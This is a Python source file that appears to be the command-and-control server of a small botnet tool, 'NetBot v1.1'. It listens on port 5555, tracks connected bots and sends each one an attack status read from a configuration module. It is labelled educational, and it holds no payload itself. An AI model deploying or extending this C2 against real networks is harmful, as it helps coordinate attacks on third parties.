#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Author       : Shankar Narayana Damodaran
# Contributor  : CloudsOfVenus
# Tool         : NetBot v1.1
#
# Description  : Command & control center client-server code.
#                Should be used for educational, research purposes, and internal use only.
#

import socket
import threading
from importlib import reload
from termcolor import colored

print(colored("""
 ______             ______             
|  ___ \\       _   (____  \\       _    
| |   | | ____| |_  ____)  ) ___ | |_  
| |   | |/ _  )  _)|  __  ( / _ \\|  _) 
| |   | ( (/ /| |__| |__)  ) |_| | |__ 
|_|   |_|\\____)\\___)______/ \\___/ \\___)1.1 from https://github.com/skavngr
""", "yellow"))


def config():
    try:
        import netbot_config
        netbot_config = reload(netbot_config)
        return netbot_config.ATTACK_STATUS
    except ImportError as e:
        print(colored(f"Error importing netbot_config: {e}", "red"))
        return "Default Status"


def threaded(client_socket):
    global connected
    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            response = config()
            client_socket.send(response.encode())
    except ConnectionError as e:
        print(colored(f"Connection error: {e}", "red"))
    finally:
        connected -= 1
        client_address = client_socket.getpeername()
        print(colored('Bot went Offline!', "red"),
              f'Disconnected from CCC: {client_address[0]}:{client_address[1]}',
              colored(f'Total Bots Connected: {connected}', "yellow"))
        client_socket.close()


def main():
    host = "0.0.0.0"
    port = 5555
    global connected
    connected = 0

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen(50)
        print(colored("Server started, waiting for connections...", "green"))

        while True:
            client_socket, addr = server_socket.accept()
            connected += 1
            print(colored('Bot is now Online!', "green"),
                  f'Connected to CCC: {addr[0]}:{addr[1]}',
                  colored(f'Total Bots Connected: {connected}', "yellow"))
            threading.Thread(target=threaded, args=(client_socket,), daemon=True).start()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\nServer shutting down...", "red"))
    except Exception as e:
        print(colored(f"An error occurred: {e}", "red"))
